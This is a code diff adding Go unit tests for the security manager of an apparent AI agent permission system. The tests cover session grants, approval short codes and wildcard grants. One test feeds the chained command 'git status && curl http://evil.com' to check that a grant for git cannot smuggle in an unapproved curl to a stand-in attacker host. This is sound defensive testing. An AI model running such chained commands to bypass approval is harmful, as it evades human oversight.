@@ -896,6 +896,95 @@ func TestManager_SessionGrants_AllowAllSession_Wildcard(t *testing.T) {
 	assert.True(t, mgr.HasWildcardGrant(sessionKey), "GrantSessionPermission with '*' must activate wildcard grant")
 }
 
+func TestSecurityManager_GetSessionGrants_And_ShortCode(t *testing.T) {
+	cfg := config.GetEffectiveSecurityPreset("balanced")
+	var capturedReq domain.ApprovalRequest
+	mockHITL := &mockHITLApprovalPort{
+		requestApprovalFn: func(ctx context.Context, req domain.ApprovalRequest) (domain.ApprovalDecision, error) {
+			capturedReq = req
+			return domain.ApprovalDecision{Approved: true, Action: domain.ActionAllowSession}, nil
+		},
+	}
+	mgr := NewManager(cfg, mockHITL, nil)
+	ctx := context.Background()
+	sessionKey := "test-session-grants"
+
+	// 1. Initial grants should be empty
+	assert.Nil(t, mgr.GetSessionGrants(sessionKey))
+
+	// 2. Trigger HITL with sensitive command
+	dec, err := mgr.EvaluateToolCall(ctx, domain.ToolEvaluationRequest{
+		SessionKey: sessionKey,
+		ToolName:   "run_command",
+		Args:       map[string]interface{}{"CommandLine": "pip install requests"},
+	})
+	require.NoError(t, err)
+	assert.Equal(t, domain.DecisionAllow, dec.Decision)
+
+	// Verify ShortCode was generated (4 digits)
+	assert.NotEmpty(t, capturedReq.ShortCode)
+	assert.Len(t, capturedReq.ShortCode, 4)
+
+	// Verify GetSessionGrants contains pip
+	grants := mgr.GetSessionGrants(sessionKey)
+	require.Len(t, grants, 1)
+	assert.Equal(t, "pip", grants[0].Pattern)
+	assert.Equal(t, "command", grants[0].Scope)
+
+	// Add wildcard grant
+	mgr.GrantSessionPermission(sessionKey, "*")
+	grants = mgr.GetSessionGrants(sessionKey)
+	require.Len(t, grants, 2)
+	assert.True(t, mgr.HasWildcardGrant(sessionKey))
+
+	// Clear grants
+	mgr.ClearSessionGrants(sessionKey)
+	assert.Nil(t, mgr.GetSessionGrants(sessionKey))
+}
+
+func TestManager_SessionGrants_PipelineChainNotBypassed(t *testing.T) {
+	cfg := config.GetEffectiveSecurityPreset("balanced")
+	mockHITL := &mockHITLApprovalPort{}
+	mgr := NewManager(cfg, mockHITL, nil)
+	ctx := context.Background()
+	sessionKey := "telegram:123:456:0:chain_test"
+
+	// Guard against empty sessionKey
+	mgr.GrantSessionPermission("", "curl")
+	mgr.GrantSessionPermission("   ", "curl")
+	assert.Len(t, mgr.GetSessionGrants(""), 0)
+
+	// Grant permission for base command "git" only
+	mgr.GrantSessionPermission(sessionKey, "git")
+
+	// Single git command should be allowed by session grant
+	dec, err := mgr.EvaluateToolCall(ctx, domain.ToolEvaluationRequest{
+		SessionKey: sessionKey,
+		ToolName:   "run_command",
+		Args:       map[string]interface{}{"CommandLine": "git status"},
+	})
+	require.NoError(t, err)
+	assert.Equal(t, domain.DecisionAllow, dec.Decision)
+
+	// Chained pipeline command "git status && curl http://evil.com"
+	// must NOT be bypassed merely because the first command is git.
+	// Since curl is not granted, it must trigger HITL.
+	hitlCalled := false
+	mockHITL.requestApprovalFn = func(ctx context.Context, req domain.ApprovalRequest) (domain.ApprovalDecision, error) {
+		hitlCalled = true
+		return domain.ApprovalDecision{Approved: false, Action: domain.ActionDeny}, nil
+	}
+
+	dec, err = mgr.EvaluateToolCall(ctx, domain.ToolEvaluationRequest{
+		SessionKey: sessionKey,
+		ToolName:   "run_command",
+		Args:       map[string]interface{}{"CommandLine": "git status && curl http://evil.com"},
+	})
+	require.NoError(t, err)
+	assert.True(t, hitlCalled, "Chained pipeline command with unapproved binary must trigger HITL, not bypass via base command match")
+	assert.Equal(t, domain.DecisionDeny, dec.Decision)
+}
+
 func TestSecurityManager_WorkspaceOnlyPreset(t *testing.T) {
 	tempWS := t.TempDir()
 	cfg := config.GetEffectiveSecurityPreset("workspace_only")
